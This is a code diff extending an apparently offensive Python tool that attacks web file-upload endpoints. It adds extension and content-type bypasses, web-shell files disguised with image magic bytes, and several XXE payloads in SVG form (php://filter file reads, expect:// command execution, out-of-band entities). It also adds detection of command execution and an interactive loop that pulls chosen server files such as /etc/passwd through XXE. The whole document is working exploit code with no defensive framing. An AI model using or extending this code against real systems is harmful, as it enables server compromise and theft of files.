@@ -30,14 +30,14 @@ BANNER = r"""
 """
 
 EXTENSION_CATEGORIES = {
-    "php": ["php", "php3", "php4", "php5", "php7", "phar", "phtml", "phtm", "inc", "pHp", "PhAr"],
+    "php": ["php", "php3", "php4", "php5", "php7", "phar", "phtml", "phtm", "inc", "pHp", "PhAr", "phar.jpg", "phz.jpg"],
     "asp": ["asp", "aspx", "config", "cer", "asa"],
     "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf"],
     "other": ["svg", "gif", "html", "xml"],
 }
 
 SPECIAL_CHARS = ['%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', '…']
-DEFAULT_CONTENT_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/webp']
+DEFAULT_CONTENT_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/webp', 'image/jpgg', 'image/pngg']
 
 MAGIC_HEADERS = {
     'jpeg': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01',
@@ -57,15 +57,40 @@ XXE_STANDARD = """<?xml version="1.0" encoding="UTF-8"?>
   <text x="0" y="16" font-size="16">&xxe;</text>
 </svg>"""
 
-XXE_BASE64 = """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={xxe_path}">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
-  %eval;
-  %exfil;
+XXE_BASE64 = """<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={xxe_path}" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>"""
+
+XXE_CLASSIC = """<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{xxe_path}" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>"""
+
+XXE_EXPECT = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://{xxe_path}" width="200" height="200"></image>
+</svg>"""
+
+XXE_OOB = """<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % sp SYSTEM "{xxe_path}">
+%sp;
+%param1;
 ]>
-<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
-  <text x="0" y="16" font-size="16">XXE Test</text>
+<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
+      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&exfil;</flowPara>
+         </flowDiv>
+      </flowRoot>
 </svg>"""
 
 XSS_SVG = """<?xml version="1.0" encoding="UTF-8"?>
@@ -85,10 +110,7 @@ with open(XSS_SVG_PATH, 'w') as f:
 def create_payload_with_magic_bytes(magic_bytes):
     tmp_fd, tmp_path = tempfile.mkstemp()
     with os.fdopen(tmp_fd, 'wb') as tmp_file:
-        if magic_bytes.startswith(b'\xFF\xD8') or magic_bytes.startswith(b'\x89PNG'):
-            tmp_file.write(b'GIF89a')
-        else:
-            tmp_file.write(magic_bytes)
+        tmp_file.write(magic_bytes)
         tmp_file.write(b'\n')
         tmp_file.write(WEB_SHELL.encode())
     return tmp_path
@@ -97,9 +119,12 @@ def create_payload_with_magic_bytes(magic_bytes):
 def generate_xxe_payloads(xxe_paths, xxe_variants):
     payloads = {}
     templates = {
+        'simple': XXE_SIMPLE,
         'standard': XXE_STANDARD, 
         'base64': XXE_BASE64,
-        'simple': XXE_SIMPLE
+        'classic': XXE_CLASSIC,
+        'expect': XXE_EXPECT,
+        'oob': XXE_OOB
     }
     
     for path in xxe_paths:
@@ -107,7 +132,7 @@ def generate_xxe_payloads(xxe_paths, xxe_variants):
         for variant in xxe_variants:
             if variant in templates:
                 content = templates[variant].format(xxe_path=path)
-                file_path = os.path.join(os.getcwd(), "xxe_" + variant + "_" + safe_name + ".xml")
+                file_path = os.path.join(os.getcwd(), "xxe_" + variant + "_" + safe_name + ".svg")
                 with open(file_path, 'w') as f:
                     f.write(content)
                 payloads[variant + "-" + safe_name] = (file_path, "XXE " + variant + " " + path)
@@ -147,21 +172,37 @@ def test_rce(url, cookies, headers, proxies):
         if "<?php" in text or "system($_GET" in text:
             return None
         
+        # Check for command output
         if any(i in text for i in ["uid=", "www-data", "root", "CMD:"]):
             return text.strip()
+        
+        # Sometimes output is in images or base64 - check response size
+        if len(text) > 0 and response.status_code == 200:
+            # Try to find patterns that suggest execution
+            if re.search(r'(uid=\d+|gid=\d+|groups=)', text):
+                return text.strip()
+                
     except:
         pass
     return None
 
 
-def test_xxe(url, cookies, headers, proxies):
+def test_xxe(url, cookies, headers, proxies, check_page=None):
     try:
-        response = requests.get(url, timeout=10, cookies=cookies, headers=headers, 
+        page_to_check = check_page if check_page else url
+        
+        response = requests.get(page_to_check, timeout=10, cookies=cookies, headers=headers, 
                               proxies=proxies, verify=False)
         text = response.text
         
         if len(text) < 10:
             return None
+        
+        svg_texts = re.findall(r'<text[^>]*>(.*?)</text>', text, re.DOTALL | re.IGNORECASE)
+        for svg_text in svg_texts:
+            stripped = svg_text.strip()
+            if len(stripped) > 100 and re.match(r'^[A-Za-z0-9+/]+=*$', stripped):
+                return "Base64 in SVG <text>:\n" + stripped
         
         b64_matches = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', text)
         if b64_matches:
@@ -173,13 +214,6 @@ def test_xxe(url, cookies, headers, proxies):
         for comment in comments:
             if any(ind in comment for ind in indicators):
                 return "XXE in comment:\n" + comment[:500]
-        
-        svg_texts = re.findall(r'<text[^>]*>(.*?)</text>', text, re.DOTALL | re.IGNORECASE)
-        for svg_text in svg_texts:
-            if len(svg_text) > 100:
-                return "Base64 in SVG:\n" + svg_text
-            if any(ind in svg_text for ind in indicators):
-                return "XXE in SVG:\n" + svg_text[:500]
         
         all_tags = re.findall(r'<[^>]+>(.*?)</[^>]+>', text, re.DOTALL)
         for tag_content in all_tags:
@@ -223,10 +257,13 @@ def generate_variants(base_name, ext):
 
 
 def run_rce_attack(upload_url, base_url, extensions, content_types, use_magic, upload_path, 
-                   param_name, cookies, headers, proxies, stop_on_success):
+                   param_name, cookies, headers, proxies, stop_on_success, date_prefix=False, date_format='%y%m%d'):
     results = []
     shells = []
     stop_flag = [False]
+    
+    from datetime import datetime
+    date_str = datetime.now().strftime(date_format) + '_' if date_prefix else ''
 
     def process(ext):
         if stop_flag[0]:
@@ -243,16 +280,21 @@ def run_rce_attack(upload_url, base_url, extensions, content_types, use_magic, u
                             return
                         uploaded = upload_file(upload_url, filename, ctype, m_bytes, None, 
                                              param_name, cookies, headers, proxies)
-                        url = urljoin(base_url, upload_path + filename)
+                        
+                        actual_filename = date_str + filename
+                        url = urljoin(base_url, upload_path + actual_filename)
+                        
+                        console.print(f"[dim]Testing: {filename} -> {actual_filename} | {ctype} | {m_name}[/dim]")
                         
                         if uploaded:
                             output = test_rce(url, cookies, headers, proxies)
                             status = output if output else "Uploaded but no RCE"
                             results.append((filename, url, status, ctype, m_name))
                             
-                            if output and "CMD:" in output:
+                            if output and ("CMD:" in output or "uid=" in output):
                                 shells.append(url)
                                 console.print("\n[bold green]✓ RCE FOUND: " + filename + " (" + m_name + ")[/bold green]")
+                                console.print(f"[bold cyan]URL: {url}[/bold cyan]")
                                 if stop_on_success:
                                     stop_flag[0] = True
                                     return
@@ -261,16 +303,19 @@ def run_rce_attack(upload_url, base_url, extensions, content_types, use_magic, u
                 else:
                     uploaded = upload_file(upload_url, filename, ctype, None, None, 
                                          param_name, cookies, headers, proxies)
-                    url = urljoin(base_url, upload_path + filename)
+                    
+                    actual_filename = date_str + filename
+                    url = urljoin(base_url, upload_path + actual_filename)
                     
                     if uploaded:
                         output = test_rce(url, cookies, headers, proxies)
                         status = output if output else "Uploaded but no RCE"
                         results.append((filename, url, status, ctype, "None"))
                         
-                        if output and "CMD:" in output:
+                        if output and ("CMD:" in output or "uid=" in output):
                             shells.append(url)
                             console.print("\n[bold green]✓ RCE FOUND: " + filename + "[/bold green]")
+                            console.print(f"[bold cyan]URL: {url}[/bold cyan]")
                             if stop_on_success:
                                 stop_flag[0] = True
                                 return
@@ -284,19 +329,25 @@ def run_rce_attack(upload_url, base_url, extensions, content_types, use_magic, u
 
 
 def run_xxe_attack(upload_url, base_url, xxe_paths, xxe_variants, upload_path, 
-                   param_name, cookies, headers, proxies, stop_on_success, content_types=None):
+                   param_name, cookies, headers, proxies, stop_on_success, content_types=None, check_page=None):
     results = []
     exploits = []
     stop_flag = [False]
     
+    if not check_page:
+        check_page = base_url
+        console.print(f"[cyan]Will check homepage for XXE output: {check_page}[/cyan]")
+    else:
+        console.print(f"[cyan]Will check custom page for XXE output: {check_page}[/cyan]")
+    
     payloads = generate_xxe_payloads(xxe_paths, xxe_variants)
-    extensions = ['xml']
+    extensions = ['svg', 'xml']
     
     if not content_types:
         content_types = [
+            'image/svg+xml',
             'application/xml',
             'text/xml',
-            'image/svg+xml',
             'text/plain',
             'application/x-xml'
         ]
@@ -306,7 +357,7 @@ def run_xxe_attack(upload_url, base_url, xxe_paths, xxe_variants, upload_path,
     def process(ext):
         if stop_flag[0]:
             return
-        for filename in ["xxe." + ext, "test." + ext, "upload." + ext]:
+        for filename in ["evil." + ext, "xxe." + ext, "test." + ext, "upload." + ext]:
             if stop_flag[0]:
                 return
             for content_type in content_types:
@@ -321,18 +372,18 @@ def run_xxe_attack(upload_url, base_url, xxe_paths, xxe_variants, upload_path,
                     
                     uploaded = upload_file(upload_url, filename, content_type, None, payload_path, 
                                          param_name, cookies, headers, proxies)
-                    url = urljoin(base_url, upload_path + filename)
                     
                     if uploaded:
-                        output = test_xxe(url, cookies, headers, proxies)
+                        output = test_xxe(check_page, cookies, headers, proxies, check_page)
                         status = output if output else "Uploaded but no XXE"
-                        results.append((filename, url, status, payload_desc, content_type))
+                        results.append((filename, check_page, status, payload_desc, content_type))
                         
                         if output:
-                            exploits.append(url)
+                            exploits.append(check_page)
                             console.print("\n[bold green]✓ XXE FOUND: " + filename + "[/bold green]")
                             console.print("[bold cyan]Content-Type: " + content_type + "[/bold cyan]")
                             console.print("[bold cyan]Payload: " + payload_desc + "[/bold cyan]")
+                            console.print("[bold cyan]Checked page: " + check_page + "[/bold cyan]")
                             console.print("\n[yellow]Raw output:[/yellow]")
                             console.print(output[:800])
                             
@@ -341,16 +392,76 @@ def run_xxe_attack(upload_url, base_url, xxe_paths, xxe_variants, upload_path,
                                 if b64_match:
                                     b64_data = b64_match.group(0)
                                     decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
-                                    console.print("\n[bold green]Base64 Decoded:[/bold green]")
+                                    console.print("\n[bold green]═══ Base64 Decoded ═══[/bold green]")
                                     console.print(decoded[:2000])
-                            except:
-                                pass
+                                    console.print("[bold green]═══════════════════════[/bold green]\n")
+                                    
+                                    # Interactive mode - ask if user wants to extract another file
+                                    console.print("[bold cyan]XXE exploit successful![/bold cyan]")
+                                    console.print(f"[cyan]Current working payload: {filename} with {content_type}[/cyan]\n")
+                                    
+                                    while True:
+                                        try:
+                                            user_input = input("Enter file path to extract (or 'q' to quit, 'continue' to keep testing): ").strip()
+                                            
+                                            if user_input.lower() in ['q', 'quit', 'exit']:
+                                                console.print("[yellow]Exiting interactive mode[/yellow]")
+                                                stop_flag[0] = True
+                                                return
+                                            
+                                            if user_input.lower() == 'continue':
+                                                console.print("[yellow]Continuing automated testing...[/yellow]")
+                                                break
+                                            
+                                            if not user_input:
+                                                continue
+                                            
+                                            # Create new payload with user's file path
+                                            console.print(f"[cyan]Extracting: {user_input}[/cyan]")
+                                            new_payload_content = XXE_BASE64.format(xxe_path=user_input)
+                                            temp_payload_path = os.path.join(os.getcwd(), "xxe_interactive_temp.svg")
+                                            with open(temp_payload_path, 'w') as f:
+                                                f.write(new_payload_content)
+                                            
+                                            # Upload new payload
+                                            uploaded = upload_file(upload_url, filename, content_type, None, temp_payload_path, 
+                                                                 param_name, cookies, headers, proxies)
+                                            
+                                            if uploaded:
+                                                # Check for output
+                                                new_output = test_xxe(check_page, cookies, headers, proxies, check_page)
+                                                if new_output:
+                                                    console.print("\n[bold green]✓ File extracted![/bold green]")
+                                                    console.print(new_output[:800])
+                                                    
+                                                    # Try to decode
+                                                    new_b64_match = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', new_output)
+                                                    if new_b64_match:
+                                                        new_b64_data = new_b64_match.group(0)
+                                                        new_decoded = base64.b64decode(new_b64_data).decode('utf-8', errors='ignore')
+                                                        console.print("\n[bold green]═══ Base64 Decoded ═══[/bold green]")
+                                                        console.print(new_decoded[:2000])
+                                                        console.print("[bold green]═══════════════════════[/bold green]\n")
+                                                else:
+                                                    console.print("[yellow]No XXE output found for this file[/yellow]")
+                                            else:
+                                                console.print("[red]Upload failed[/red]")
+                                            
+                                        except KeyboardInterrupt:
+                                            console.print("\n[yellow]Exiting interactive mode[/yellow]")
+                                            stop_flag[0] = True
+                                            return
+                                        except Exception as e:
+                                            console.print(f"[red]Error: {e}[/red]")
+                                    
+                            except Exception as e:
+                                console.print(f"[yellow]Could not decode base64: {e}[/yellow]")
                             
                             if stop_on_success:
                                 stop_flag[0] = True
                                 return
                     else:
-                        results.append((filename, url, "Upload failed", payload_desc, content_type))
+                        results.append((filename, check_page, "Upload failed", payload_desc, content_type))
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
         list(executor.map(process, extensions))
@@ -434,7 +545,9 @@ def main():
     
     parser.add_argument("--upload-url", required=True, help="Upload endpoint")
     parser.add_argument("--base-url", required=True, help="Base URL")
-    parser.add_argument("--upload-path", default="/profile_images/", help="Upload directory")
+    parser.add_argument("--upload-path", default="/profile_images/", help="Upload directory path")
+    parser.add_argument("--date-prefix", action="store_true", help="Try with YYMMDD_ date prefix on filenames")
+    parser.add_argument("--date-format", default="%y%m%d", help="Date format for prefix (default: %%y%%m%%d for YYMMDD)")
     parser.add_argument("--attack-mode", choices=['rce', 'xxe', 'xss'], required=True, help="Attack mode")
     
     parser.add_argument("--extensions", nargs='+', help="Extensions to test")
@@ -443,7 +556,8 @@ def main():
     parser.add_argument("--magic-bytes", action="store_true", help="Enable magic bytes")
     
     parser.add_argument("--xxe-paths", nargs='+', help="XXE file paths")
-    parser.add_argument("--xxe-variants", nargs='+', choices=['standard', 'base64', 'simple', 'all'], help="XXE variants")
+    parser.add_argument("--xxe-variants", nargs='+', choices=['simple', 'standard', 'base64', 'classic', 'expect', 'oob', 'all'], help="XXE variants")
+    parser.add_argument("--check-page", help="Page to check for XXE output (default: base-url homepage)")
     
     parser.add_argument("--param-name", default="uploadFile", help="Parameter name")
     parser.add_argument("--cookies", help="Cookies")
@@ -487,9 +601,13 @@ def main():
             content_types = args.content_types or ['image/jpeg']
         
         console.print("[cyan]Extensions: " + str(len(extensions)) + " | Content-Types: " + str(len(content_types)) + "[/cyan]")
+        if args.date_prefix:
+            from datetime import datetime
+            console.print(f"[cyan]Using date prefix format: {args.date_format} ({datetime.now().strftime(args.date_format)}_)[/cyan]")
+        
         results, shells = run_rce_attack(args.upload_url, args.base_url, extensions, content_types, 
                                         args.magic_bytes, args.upload_path, args.param_name, 
-                                        cookies, headers, proxies, args.stop_on_success)
+                                        cookies, headers, proxies, args.stop_on_success, args.date_prefix, args.date_format)
         print_results(results)
         
         if shells:
@@ -514,15 +632,16 @@ def main():
                     shell_interaction(shells[0], cookies, headers, proxies)
             
     elif args.attack_mode == 'xxe':
-        xxe_paths = args.xxe_paths or ['file:///etc/passwd', 'file:///etc/hosts']
-        xxe_variants = ['standard', 'base64', 'simple'] if 'all' in (args.xxe_variants or []) else (args.xxe_variants or ['simple'])
+        xxe_paths = args.xxe_paths or ['/etc/passwd', 'upload.php', 'index.php']
+        xxe_variants = ['simple', 'standard', 'base64', 'classic', 'expect', 'oob'] if 'all' in (args.xxe_variants or []) else (args.xxe_variants or ['base64'])
         
         content_types = args.content_types if args.content_types else None
+        check_page = args.check_page if args.check_page else args.base_url
         
         console.print("[cyan]XXE Paths: " + str(len(xxe_paths)) + " | Variants: " + str(len(xxe_variants)) + "[/cyan]")
         results, exploits = run_xxe_attack(args.upload_url, args.base_url, xxe_paths, xxe_variants, 
                                           args.upload_path, args.param_name, cookies, headers, proxies, 
-                                          args.stop_on_success, content_types)
+                                          args.stop_on_success, content_types, check_page)
         print_results(results)
         
     elif args.attack_mode == 'xss':
